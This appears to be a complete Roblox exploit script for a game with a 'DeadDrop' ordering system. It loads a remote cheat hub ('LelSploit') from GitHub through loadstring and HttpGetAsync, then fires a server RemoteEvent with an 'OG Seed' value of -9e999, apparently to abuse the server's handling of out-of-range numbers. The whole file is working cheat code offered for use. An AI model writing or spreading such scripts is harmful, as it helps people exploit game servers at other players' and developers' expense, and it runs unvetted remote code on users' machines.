local Hub = loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Leofreddare/LelSploit/main/LelHub/u.luau"))()("Schedule")
local LelUI = Hub.Native
local Instance = LelUI.Instance
task.spawn(function()
local args = {
	"DeadDrop/Order",
	{
		{
			["OG Seed"] = -9e999
		}
	}
}
game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Net"):WaitForChild("RE/UICommunication"):FireServer(unpack(args))

end)
